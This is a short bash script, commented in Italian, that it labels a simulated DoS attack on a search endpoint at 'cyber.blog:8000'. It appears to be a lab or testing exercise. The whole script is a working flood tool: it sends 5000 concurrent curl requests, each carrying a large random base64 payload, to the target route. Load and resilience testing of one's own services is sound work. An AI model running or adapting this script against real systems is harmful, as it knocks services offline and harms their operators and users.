#!/bin/bash

# URL della rotta da attaccare
URL="http://cyber.blog:8000/articles/search"

# Generare un grande payload casuale
LARGE_PAYLOAD=$(head -c 1000 < /dev/urandom | base64)

# Numero di richieste da inviare
NUM_REQUESTS=5000

# Funzione per eseguire la richiesta
# send_request() {
    # curl -G "$URL" --data-urlencode "query=$LARGE_PAYLOAD" > /dev/null 2>&1
    send_request() {
    curl -s -G "$URL" --data-urlencode "query=$LARGE_PAYLOAD" > /dev/null
}
# }

echo "Inizio attacco DoS simulato..."

# Loop per inviare tante richieste
for ((i=1; i<=NUM_REQUESTS; i++))
do
    send_request &
    echo "Richiesta $i inviata"
done

echo "Attacco DoS simulato completato!"
